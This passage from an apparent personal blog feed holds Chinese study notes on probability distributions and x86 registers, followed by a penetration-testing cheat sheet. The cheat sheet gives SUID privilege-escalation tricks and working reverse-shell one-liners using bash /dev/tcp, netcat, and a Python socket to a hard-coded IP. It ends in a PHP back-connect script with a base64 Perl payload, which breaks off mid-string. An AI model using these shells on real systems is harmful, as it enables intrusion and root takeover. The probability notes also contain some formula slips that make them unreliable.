class="math inline">\(\Longleftrightarrow\)</span> <span
class="math inline">\(P(X=a)=0\)</span></li>
</ul></li>
</ul>
<h3
id="常见连续型随机变量及其概率分布">常见连续型随机变量及其概率分布</h3>
<ol type="1">
<li><p>均匀分布</p>
<ol type="1">
<li><p><span class="math display">\[
f(x)=\cases{\frac{1}{b-a},a&lt;x&lt;b\\
0,其他}
\]</span></p></li>
<li><p>则称 <span class="math inline">\(X\)</span>在 <span
class="math inline">\((a,b)\)</span>上服从均匀分布.记为 <span
class="math inline">\(X\sim U(a,b)\)</span></p></li>
<li><p>落入区间任意等长度的子区间的可能型相同</p></li>
</ol></li>
<li><p>指数分布/寿命分布</p>
<ol type="1">
<li><p><span class="math display">\[
f(x)=\cases{\frac{1}{\theta}e^{-x/\theta},x&gt;0\\
0,其他}
\]</span></p></li>
<li><p>其中 <span class="math inline">\(\theta&gt;0\)</span>为常数,则称
<span class="math inline">\(X\)</span>服从参数为 <span
class="math inline">\(\theta\)</span>的指数分布,记为 <span
class="math inline">\(X\sim E(\theta)\)</span></p></li>
<li><p>另一种记法,令 <span
class="math inline">\(\frac{1}{\theta}=\lambda\)</span></p></li>
<li><p><span class="math display">\[
f(x)=\cases{\lambda e^{-\lambda x},x&gt;0\\
0,x\le0}
\]</span></p></li>
<li><p>记为 <span class="math inline">\(X\sim
E(\lambda)\)</span></p></li>
<li><p>分布函数</p>
<ol type="1">
<li><p><span class="math display">\[
F(x)=\cases{1-e^{-x/\theta},x&gt;0\\
0,其他}
\]</span></p></li>
<li><p>使用积分计算分段函数可得到分布函数</p></li>
</ol></li>
<li><p>无记忆性</p>
<ol type="1">
<li>对于任意 <span class="math inline">\(s,t&gt;0\)</span>,有</li>
<li><span
class="math inline">\(P\{X&gt;s+t|X&gt;s\}=P\{X|t\}\)</span></li>
</ol></li>
</ol></li>
<li><p>正态分布/正常分布</p>
<ol type="1">
<li><p><span class="math display">\[
f(x)=\frac{1}{\sqrt{2\pi}\sigma}e^{-\frac{(x-\mu)^2}{2\sigma^2}},-\infty&lt;x&lt;\infty
\]</span></p></li>
<li><p>其中 <span
class="math inline">\(\mu(任意),\sigma(\sigma&gt;0)\)</span>为常数,则称
<span class="math inline">\(X\)</span>服从参数为 <span
class="math inline">\(\mu,\sigma\)</span>的<strong>正态分布</strong>或<strong>高斯分布</strong>.记为
<span class="math inline">\(X\sim N(\mu,\sigma^2)\)</span></p></li>
<li><p><strong>性质</strong></p>
<ol type="1">
<li>曲线关于 <span
class="math inline">\(x=\mu\)</span>对称,这表明对于任意 <span
class="math inline">\(h&gt;0\)</span>,有 <span
class="math inline">\(P\{\mu-h&lt;X\le\mu\}=P\{\mu&lt;X\le
\mu+h\}\)</span></li>
<li>当 <span class="math inline">\(x=\mu\)</span>时渠道最大值 <span
class="math inline">\(f(\mu)=\frac{1}{\sqrt{2\pi}\sigma}\)</span></li>
<li>在 <span
class="math inline">\(x=\mu\pm\sigma\)</span>处曲线有<u>拐点</u>(凹凸性发生改变)</li>
<li>曲线以 <span class="math inline">\(x\)</span>轴为渐近线</li>
<li>如果固定 <span class="math inline">\(\sigma\)</span>,改变 <span
class="math inline">\(\mu\)</span>的大小,则图形沿着 <span
class="math inline">\(Ox\)</span>轴平移,而不改变其形状.正态分布概率分布密度曲线完全由参数
<span class="math inline">\(\mu\)</span>确定. <span
class="math inline">\(\mu\)</span>称为位置参数</li>
<li>如果固定 <span class="math inline">\(\mu\)</span>,改变 <span
class="math inline">\(\sigma\)</span>的大小,<span
class="math inline">\(f(x)\)</span>图形的对称轴不变,而形状在改变, <span
class="math inline">\(\sigma\)</span>越小,图形越高瘦,<span
class="math inline">\(\sigma\)</span>越大,图形越矮胖.<span
class="math inline">\(\sigma\)</span>称为形状参数</li>
</ol></li>
<li><p><span class="math inline">\(\Phi(-x)=1-\Phi(x)\)</span></p></li>
<li><p><span class="math inline">\(\Phi(0)=0.5\)</span></p></li>
<li><p>特征:倒钟型</p></li>
</ol></li>
<li><p>标准柯西分布</p>
<ol type="1">
<li><p><span class="math display">\[
f(x)=\frac{1}{\pi(1+x^2)},-\infty&lt;x&lt;\infty
\]</span></p></li>
<li><p>则称 <span
class="math inline">\(X\)</span>服从标准柯西分布</p></li>
<li><p>标准柯西分布的分布函数为:</p>
<ol type="1">
<li><span class="math display">\[
F(x)=\frac{1}{2}+\frac{1}{\pi}arc\tan x
\]</span></li>
</ol></li>
</ol></li>
</ol>
<h4 id="标准正态分布的上-alpha分位点">标准正态分布的上 <span
class="math inline">\(\alpha\)</span>分位点</h4>
<p><span class="math inline">\(0&lt;\alpha&lt;1\)</span></p>
<p>没看懂</p>
<h3 id="离散型随机变量的函数的分布">离散型随机变量的函数的分布</h3>
<p>用图表来计算.</p>
<h3 id="连续型随机变量的函数的分布">连续型随机变量的函数的分布</h3>
<h4 id="定理-2">定理</h4>
<p>设随机变量 <span class="math inline">\(X\)</span>具有概率密度 <span
class="math inline">\(f_X(x)\)</span>,<span
class="math inline">\(-\infty&lt;x&lt;\infty\)</span>,设函数 <span
class="math inline">\(g(x)\)</span>处处可到切恒友 <span
class="math inline">\(g&#39;(x)&gt;0\)</span>(或恒有 <span
class="math inline">\(g&#39;(x)&lt;0\)</span>),则 <span
class="math inline">\(Y=g(X)\)</span>是连续型随机变量,其概率密度为 <span
class="math display">\[
f_Y(y)=\cases{f_X[h(y)]|h&#39;(y)|,\alpha&lt;y&lt;\beta\\
0,其他}
\]</span> 其中 <span
class="math inline">\(\alpha=min\{g(-\infty),g(\infty),\}\beta
=max\{g(-\infty),g(\infty)\}\)</span>,<span
class="math inline">\(h(y)\)</span>是 <span
class="math inline">\(g(x)\)</span>的反函数</p>
<h4 id="说明-1">说明</h4>
<p>若 <span class="math inline">\(f(x)\)</span>在有线区间 <span
class="math inline">\([a,b]\)</span>以外等于零,则只需假设在 <span
class="math inline">\([a,b]\)</span>上恒有 <span
class="math inline">\(g&#39;(x)&gt;0(或恒有g&#39;(x)&lt;0)\)</span>,此时,<span
class="math inline">\(\alpha=min\{g(a),g(b)\},\beta=max\{g(a),g(b)\}\)</span></p>
<h2 id="第三章多维随机变量及其分布">第三章:多维随机变量及其分布</h2>
<h3 id="多维随机变量">多维随机变量</h3>
<h4 id="性质-2">性质</h4>
<ol type="1">
<li><p><span class="math inline">\(F(x,y)\)</span>是变量 <span
class="math inline">\(x\)</span>和 <span
class="math inline">\(y\)</span>的不减函数,即对于任意固定的 <span
class="math inline">\(y\)</span>,当 <span
class="math inline">\(x_2&gt;x_1\)</span>时 <span
class="math inline">\(F(x_2,y)\ge F(x_1,y)\)</span>;对于任意固定的 <span
class="math inline">\(x\)</span>,当 <span
class="math inline">\(y_2&gt;y_1\)</span>时 <span
class="math inline">\(F(x,y_2)\ge F(x,y_1)\)</span></p></li>
<li><p><span class="math inline">\(0\le F(x,y)\le
1\)</span>,且对于任意固定的y,<span
class="math inline">\(F(-\infty,y)=0\)</span>,对于任意固定的 <span
class="math inline">\(x\)</span>,<span
class="math inline">\(F(x,-\infty)=0\)</span>,<span
class="math inline">\(F(-\infty,-\infty)=0,F(+\infty,+\infty)=1\)</span></p></li>
<li><p><span
class="math inline">\(F(x+0,y)=F(x,y),F(x,y+0)=F(x,y)\)</span>,即 <span
class="math inline">\(F(x,y)\)</span>关于 <span
class="math inline">\(x\)</span>右连续,关于 <span
class="math inline">\(y\)</span>也右连续</p></li>
<li><p>对于任意 <span
class="math inline">\((x_1,y_1),(x_2,y_2),x_1&lt;x_2,y_1&lt;y_2\)</span>,下述不等式成立:</p>
<ol type="1">
<li><p><span class="math display">\[
F(x_2,y_2)-F(x_2,y_1)+F(x_1,y_1)-F(x_1,y_2)  \ \ \ 加同减异
\]</span></p></li>
<li><p>二维随机变量落入这个面积的概率</p></li>
</ol></li>
</ol>
<h3 id="二维离散随机变量的分布律">二维离散随机变量的分布律</h3>
<h4 id="性质-3">性质</h4>
<ol type="1">
<li>非负性 <span class="math inline">\(p_{ij}\ge 0\)</span></li>
<li>规范性 <span
class="math inline">\(\sum\limits_{i=1}^\infty\sum\limits_{j=1}^\infty
p_{ij}=1\)</span></li>
</ol>
<ul>
<li><p>公式法</p>
<ul>
<li>称 <span
class="math inline">\(P\{X=x_i,Y=y_i\}=p_{ij};i,j=1,2,\cdots\)</span>为离散型随机变量
<span class="math inline">\((X,Y)\)</span>的分布律,或随机变量 <span
class="math inline">\(X\)</span>和 <span
class="math inline">\(Y\)</span>的联合分布律</li>
</ul></li>
<li><p>表格法</p>
<ul>
<li><table>
<thead>
<tr class="header">
<th><span class="math inline">\(Y\setminus X\)</span></th>
<th><span class="math inline">\(x_1\)</span></th>
<th><span class="math inline">\(x_2\)</span></th>
<th><span class="math inline">\(\cdots\)</span></th>
<th><span class="math inline">\(x_i\)</span></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><span class="math inline">\(y_1\)</span></td>
<td><span class="math inline">\(p_{11}\)</span></td>
<td><span class="math inline">\(p_{21}\)</span></td>
<td><span class="math inline">\(\cdots\)</span></td>
<td><span class="math inline">\(p_{i1}\)</span></td>
</tr>
<tr class="even">
<td><span class="math inline">\(y_2\)</span></td>
<td><span class="math inline">\(p_{12}\)</span></td>
<td><span class="math inline">\(p_{22}\)</span></td>
<td><span class="math inline">\(\cdots\)</span></td>
<td><span class="math inline">\(p_{i2}\)</span></td>
</tr>
<tr class="odd">
<td><span class="math inline">\(\cdots\)</span></td>
<td><span class="math inline">\(\cdots\)</span></td>
<td><span class="math inline">\(\cdots\)</span></td>
<td><span class="math inline">\(\cdots\)</span></td>
<td><span class="math inline">\(\cdots\)</span></td>
</tr>
<tr class="even">
<td><span class="math inline">\(y_j\)</span></td>
<td><span class="math inline">\(p_{1j}\)</span></td>
<td><span class="math inline">\(p_{2j}\)</span></td>
<td><span class="math inline">\(\cdots\)</span></td>
<td><span class="math inline">\(p_{ij}\)</span></td>
</tr>
</tbody>
</table></li>
</ul></li>
</ul>
<h3 id="二维连续型随机变量">二维连续型随机变量</h3>
<h4 id="性质-4">性质</h4>
<ol type="1">
<li><span class="math inline">\(f(x,y)\ge 0\)</span> 非负性</li>
<li><span
class="math inline">\(\int_{-\infty}^{\infty}\int_{-\infty}^{\infty}f(x,y)dxdy=F(\infty,\infty)=1\)</span>
规范性</li>
<li>设 <span class="math inline">\(G\)</span>是 <span
class="math inline">\(xoy\)</span>平面上的区域,点<span
class="math inline">\((X,Y)\)</span>落在 <span
class="math inline">\(G\)</span>内的概率为 <span
class="math inline">\(P\{(X,Y)\in
G\}=\mathop{\int\int}\limits_Gf(x,y)dxdy\)</span></li>
<li>若 <span class="math inline">\(f(X,Y)\)</span>在 <span
class="math inline">\((x,y)\)</span>连续,则有 <span
class="math inline">\(\frac{\partial^2 F(X,Y)}{\partial x\partial
y}=f(x,y)\)</span></li>
</ol>
<h3 id="边缘分布">边缘分布</h3>
<p><span class="math inline">\(F_X(x)=P\{X\le x\}=F(x,+\infty)=P\{X\le
x,Y&lt;+\infty\}\)</span></p>
<p><span class="math inline">\(F_Y(y)=P(Y\le
y)=F(+\infty,y)=P\{x&lt;+\infty ,Y\le y\}\)</span></p>
<h3
id="二维离散型的联合分布和边缘分布">二维离散型的联合分布和边缘分布</h3>
<p><span class="math inline">\(F(x,y)=P\{X\le x,Y\le
y\}=\sum\limits_{x_i\in X}\sum\limits_{y_j\in Y}P_{ij}\)</span></p>
<h3 id="二维连续型">二维连续型</h3>
<h4 id="定义-1">定义</h4>
<ol type="1">
<li>$f(x,y) $非负性</li>
<li><span
class="math inline">\(\int_{-\infty}^{+\infty}\int_{-\infty}^{+\infty}f(x,y)dxdy=1\)</span>
规范性</li>
<li><span class="math inline">\(\frac{\partial^2F(x,y)}{\partial
x\partial y}=f(x,y)\)</span></li>
<li><span class="math inline">\(P\{(x,y)\in
G\}=\mathop{\int\int}\limits_Gf(x,y)dxdy\)</span> <span
class="math inline">\(G\)</span>是 <span
class="math inline">\(X,Y\)</span>平面上的一个区域</li>
</ol>
<h3 id="条件分布">条件分布</h3>
<h4 id="离散型">离散型</h4>
<p>二维离散型随机变量的分布律为 <span class="math display">\[
P\{X=x_i,Y=y_i\}=P_{ij},i,j=1,2\cdots
\]</span> 由条件概率公式 <span class="math display">\[
P\{X=x_i,Y=y_i\}=\frac{P\{X=x_i,Y=y_i\}}{P\{Y=y_i\}}=\frac{P_{ij}}{P_j},i=1,2,\cdots
\]</span></p>
<h5 id="性质-5">性质</h5>
<ol type="1">
<li><span class="math inline">\(P\{X=x_i|Y=y_i\}\ge 0\)</span>
非负性</li>
<li><span class="math inline">\(\sum\limits_{i=1}^\infty
P\{X=x_i|Y=y_i\}=1\)</span> 规范性</li>
</ol>
<h4 id="连续型">连续型</h4>
<p>二维连续型随机变量 <span
class="math inline">\((X,Y)\)</span>的联合概率密度 <span
class="math inline">\(f(x,y)\)</span></p>
<p>边缘概率密度 <span class="math inline">\(f_X(x),f_Y(y)\)</span></p>
<p>若 <span class="math inline">\(f_Y(y)&gt;0\)</span>在 <span
class="math inline">\(Y=y\)</span>的情况下</p>
<p><span
class="math inline">\(F(x,y)=\int_{-\infty}^x\frac{f(u,y)}{f_Y(y)}du\)</span></p>
<p><span class="math inline">\(f(x|y)=\frac{f(x,y)}{f_Y(y)}\ \ \ \
f(y|x)=\frac{f(x,y)}{f_X(x)}\)</span></p>
<p><span
class="math inline">\(F(y|x)=\int_{-\infty}^y\frac{f(x,v)}{f_X(x)}dv\)</span></p>
<p><span class="math inline">\(P\{X\le x|Y\le y\}=\frac{P\{X\le
x,Y=y\}}{P\{Y=y\}}=\mathop{lim}\limits_{\varepsilon\rightarrow0}\frac{\int_{-\infty}^x\frac{1}{\varepsilon}\int_y^{y+\varepsilon}f(u,v)dudv}{\frac{1}{\varepsilon}\int_y^{y+\varepsilon}f_v(v)dv}=\frac{\int_{-infty}^xf(u,v)du}{f_Y(y)}=\int_{-\infty}^x\frac{f(u,y)}{f_Y(y)}du\)</span></p>
<h3 id="随机变量的独立性">随机变量的独立性</h3>
<h4 id="离散型-1">离散型</h4>
<p><span class="math inline">\(P\{X=x_i,Y=y_i\}=P\{X=x_i\}\cdot
P\{Y=y_i\}\)</span></p>
<h4 id="连续型-1">连续型</h4>
<p><span class="math inline">\(f(x,y)=f_X(x)f_Y(y)\)</span></p>
<h3 id="多维随机变量函数的分布">多维随机变量函数的分布</h3>
<h4 id="卷积公式">卷积公式</h4>
<p>对于连续型随机变量 <span
class="math inline">\((X,Y)\)</span>,设其概率密度函数为 <span
class="math inline">\(f(x,y)\)</span>,则 <span
class="math inline">\(Z=X+Y\)</span>的分布函数为 <span
class="math display">\[
F_Z(z)=P\{Z\le z\}=P\{X+Y\le z\}=\mathop{\int\int}_{x+y\le z}f(x,y)dxdy
\]</span> <span
class="math inline">\(f_Z(z)=\int_{-\infty}^{+\infty}f_x(z-y)\cdot
f_Y(y)dy\)</span></p>
<p><span
class="math inline">\(f_Z(z)=\int_{-\infty}^{+\infty}f_X(x)\cdot
f_Z(z-x)dx\)</span></p>
]]></content>
      <categories>
        <category>大学</category>
      </categories>
  </entry>
  <entry>
    <title>汇编</title>
    <url>/%E6%B1%87%E7%BC%96/</url>
    <content><![CDATA[<h1 id="汇编相关知识">汇编相关知识</h1>
<span id="more"></span>
<h3
id="位处理器有14个寄存器每个寄存器有各自的名字">16位处理器有14个寄存器，每个寄存器有各自的名字。</h3>
<p>14个寄存器：AX、BX、CX、DX、SI、DI、SP、BP、IP、CS、SS、DS、ES、PSW。</p>
<ol type="1">
<li><p>一般寄存器</p>
<ol type="1">
<li><p>AX:累积暂存器</p></li>
<li><p>BX:基底暂存器</p></li>
<li><p>CX:计数暂存器</p></li>
<li><p>DX:资料暂存器</p></li>
</ol></li>
<li><p>索引暂存器</p>
<ol type="1">
<li><p>SI:来源索引暂存器</p></li>
<li><p>DI:目的索引暂存器</p></li>
</ol></li>
<li><p>堆叠、基底暂存器</p>
<ol type="1">
<li>SP:堆叠指标暂存器</li>
<li>BP:基底指标暂存器</li>
</ol></li>
</ol>
<p>EAX、ECX、EDX、EBX：为ax,bx,cx,dx的延伸，各为32位
ESI、EDI、ESP、EBP：为si,di,sp,bp的延伸，各为32位</p>
<p>汇编语言中CS，DS，SS还有一个ES定义如下： CS（Code
Segment）：代码段寄存器； DS（Data Segment）：数据段寄存器； SS（Stack
Segment）：堆栈段寄存器； ES（Extra Segment）：附加段寄存器。
当一个程序要执行时，就要决定程序代码、数据和堆栈各要用到内存的哪些位置，通过设定段寄存器
CS，DS，SS 来指向这些起始位置。通常是将DS固定，而根据需要修改CS。</p>
<h3
id="位处理器有16个寄存器每个寄存器有各自的名字">32位处理器有16个寄存器，每个寄存器有各自的名字。</h3>
<p>16个寄存器：EAX、EBX、ECX、EDX、ESI、EDI、ESP、EBP、ES、CS、SS、DS、FS、GS、EIP、EFLAGS。</p>
<ol type="1">
<li><p>一般寄存器</p>
<ol type="1">
<li><p>EAX 是"累加器"(accumulator),
它是很多加法乘法指令的缺省寄存器。</p></li>
<li><p>EBX 是"基地址"(base)寄存器, 在内存寻址时存放基地址。</p></li>
<li><p>ECX 是计数器(counter),
是重复(REP)前缀指令和LOOP指令的内定计数器。</p></li>
<li><p>EDX 则总是被用来放整数除法产生的余数。</p></li>
</ol></li>
<li><p>索引寄存器</p>
<ol type="1">
<li>ESI/EDI分别叫做"源/目标索引寄存器"(source/destination
index),因为在很多字符串操作指令中,
DS:ESI指向源串,而ES:EDI指向目标串.</li>
</ol></li>
<li><p>堆栈、基址寄存器</p>
<ol type="1">
<li><p>ESP
专门用作堆栈指针，被形象地称为栈顶指针，堆栈的顶部是地址小的区域，压入堆栈的数据越多，ESP也就越来越小。在32位平台上，ESP每次减少4字节。<strong>寄存器存放当前线程的栈顶指针。</strong></p></li>
<li><p>EBP是"基址指针"(BASE POINTER),
它最经常被用作高级语言函数调用的"框架指针"(frame pointer).
在破解的时候,经常可以看见一个标准的函数起始代码:</p></li>
</ol></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ebp ;保存当前ebp</span><br><span class="line">mov ebp,esp ;EBP设为当前堆栈指针</span><br><span class="line">sub esp, xxx ;预留xxx字节给函数临时变量.</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这样一来,EBP 构成了该函数的一个框架, 在EBP上方分别是原来的EBP,
返回地址和参数. EBP下方则是临时变量. 函数返回时作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">mov esp,ebp ;设置相同地址</span><br><span class="line">pop ebp ;读取ebp</span><br><span class="line">ret ;函数返回</span><br></pre></td></tr></table></figure>
<p>即可.<strong>寄存器存放当前线程的栈底指针。</strong></p>
<ol start="4" type="1">
<li><p>指令寄存器</p>
<ol type="1">
<li>EIP：寄存器存放下一个CPU指令存放的内存地址，当CPU执行完当前的指令后，从EIP寄存器中读取下一条指令的内存地址，然后继续执行。</li>
</ol></li>
<li><p>汇编语言中CS，DS，SS还有一个ES定义如下：</p>
<ol type="1">
<li><p>CS（Code Segment）：代码段寄存器；</p></li>
<li><p>DS（Data Segment）：数据段寄存器；</p></li>
<li><p>SS（Stack Segment）：堆栈段寄存器；</p></li>
<li><p>ES（Extra Segment）：附加段寄存器。</p></li>
</ol></li>
</ol>
<p>当一个程序要执行时，就要决定程序代码、数据和堆栈各要用到内存的哪些位置，通过设定段寄存器
CS，DS，SS 来指向这些起始位置。通常是将DS固定，而根据需要修改CS。</p>
<h3
id="位处理器有16个寄存器每个寄存器有各自的名字-1">64位处理器有16个寄存器，每个寄存器有各自的名字。</h3>
<p>16个寄存器：RAX、RBX、RCX、RDX、RSI、RDI、RBP、RSP、CS、DS、ES、SS、FS、GS、RIP、RFLAGS。</p>
<h2 id="引用">引用</h2>
<p><a
href="https://blog.csdn.net/xiazdong/article/details/7388945">汇编语言里
eax, ebx, ecx, edx, esi, edi, ebp,
esp_xiazdong的博客-CSDN博客_寄存器esi</a></p>
<p><a
href="https://abcdxyzk.github.io/blog/2012/11/23/assembly-args/">64位汇编参数传递
- kk Blog —— 通用基础 (abcdxyzk.github.io)</a></p>
]]></content>
  </entry>
  <entry>
    <title>渗透合集</title>
    <url>/%E6%B8%97%E9%80%8F%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<h3 id="提权相关">提权相关</h3>
<p>查看系统上运行的所有SUID可执行文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">$ find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>以上所有二进制文件都将以root用户权限执行，因为它们的权限中包含"s"，并且对应的是root权限。</p>
<p>如果Find命令也是以Suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">touch</span> pentestlab</span><br><span class="line">$ find pentestlab -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure>
大部分Linux操作系统都安装了netcat，因此也可以被利用来将权限提升至root。
<span id="more"></span> <strong>在被攻击机执行</strong> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find pentestlab -<span class="built_in">exec</span> netcat -lvp 被攻击机监听端口 -e /bin/sh \;</span><br></pre></td></tr></table></figure>
连接上去就会直接获取到一个Root权限的shell。</p>
<p><strong>在攻击机执行</strong> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ netcat 被攻击机ip 被攻击机监听端口</span><br></pre></td></tr></table></figure>
Vim是Linux环境下的一款文件编辑器。但是，如果以SUID运行的话，它会继承root用户的权限，因此可以读取系统上的所有文件。
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim.tiny /etc/shadow</span><br><span class="line"></span><br><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure> Less和More都执行以用来提权。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure></p>
<ol start="2" type="1">
<li>反弹shell相关</li>
</ol>
<h4 id="反向连接">反向连接</h4>
<ol type="1">
<li><p>使用bash <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/[tcp|udp]/攻击机ip/攻击机端口号 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p></li>
<li><p>使用nc <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nc -e /bin/sh 攻击机ip 攻击机端口号</span><br><span class="line">$ nc -c /bin/sh 攻击机ip 攻击机端口号</span><br><span class="line"></span><br><span class="line">-c shell commands       as <span class="string">&#x27;-e&#x27;</span>; use /bin/sh to <span class="built_in">exec</span> [dangerous!!]</span><br><span class="line">-e filename             program to <span class="built_in">exec</span> after connect [dangerous!!]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">没有-e的情况:</span><br><span class="line">攻击机执行：</span><br><span class="line"></span><br><span class="line">$ nc -lnvp 攻击机监听端口号</span><br><span class="line"></span><br><span class="line">被攻击机执行：</span><br><span class="line"><span class="comment"># 第一种</span></span><br><span class="line">$ /bin/sh | nc 攻击机ip 攻击机监听端口号</span><br><span class="line"><span class="comment"># 第二种</span></span><br><span class="line">$ <span class="built_in">mknod</span> /tmp/backpipe p</span><br><span class="line">或者</span><br><span class="line">$ <span class="built_in">mkfifo</span> /tmp/backpipe</span><br><span class="line">$ /bin/sh 0&lt;/tmp/backpipe | nc 攻击机ip 攻击机监听端口号 1&gt;/tmp/backpipe</span><br><span class="line"></span><br><span class="line"><span class="built_in">mknod</span> 管道名 p,<span class="built_in">mkfifo</span> 管道名 </span><br><span class="line">都是创建管道的命令</span><br></pre></td></tr></table></figure></p></li>
<li><p>使用python <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;172.28.85.115&#x27;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br><span class="line">$ python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></p></li>
<li><p>使用php 访问反弹 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span>(<span class="params"><span class="variable">$pr</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$path</span> = <span class="title function_ invoke__">execute</span>(<span class="string">&quot;which <span class="subst">$pr</span>&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> (<span class="variable">$path</span> ? <span class="variable">$path</span> : <span class="variable">$pr</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$cfe</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$cfe</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">			@<span class="title function_ invoke__">exec</span>(<span class="variable">$cfe</span>,<span class="variable">$res</span>);</span><br><span class="line">			<span class="variable">$res</span> = <span class="title function_ invoke__">join</span>(<span class="string">&quot;\n&quot;</span>,<span class="variable">$res</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">			<span class="variable">$res</span> = @<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cfe</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">			@<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">			@<span class="title function_ invoke__">system</span>(<span class="variable">$cfe</span>);</span><br><span class="line">			<span class="variable">$res</span> = @<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">			@<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">			@<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">			@<span class="title function_ invoke__">passthru</span>(<span class="variable">$cfe</span>);</span><br><span class="line">			<span class="variable">$res</span> = @<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">			@<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(@<span class="title function_ invoke__">is_resource</span>(<span class="variable">$f</span> = @<span class="title function_ invoke__">popen</span>(<span class="variable">$cfe</span>,<span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line">			<span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">			<span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$f</span>)) &#123;</span><br><span class="line">				<span class="variable">$res</span> .= @<span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="number">1024</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			@<span class="title function_ invoke__">pclose</span>(<span class="variable">$f</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span>(<span class="params"><span class="variable">$fname</span>,<span class="variable">$text</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$fp</span>=@<span class="title function_ invoke__">fopen</span>(<span class="variable">$fname</span>,<span class="string">&#x27;w&#x27;</span>)) &#123;</span><br><span class="line">		@<span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>,@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$text</span>));</span><br><span class="line">		@<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yourip</span> = <span class="string">&quot; 攻击机ip&quot;</span>;</span><br><span class="line"><span class="variable">$yourport</span> = <span class="string">&quot;攻击机监听端口号&quot;</span>;</span><br><span class="line"><span class="variable">$usedb</span> = <span class="keyword">array</span>(<span class="string">&#x27;perl&#x27;</span>=&gt;<span class="string">&#x27;perl&#x27;</span>,<span class="string">&#x27;c&#x27;</span>=&gt;<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="variable">$back_connect</span>=<span class="string">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;</span>.</span><br><span class="line"><span class="string">&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;</span>.</span><br><span class="line"><span 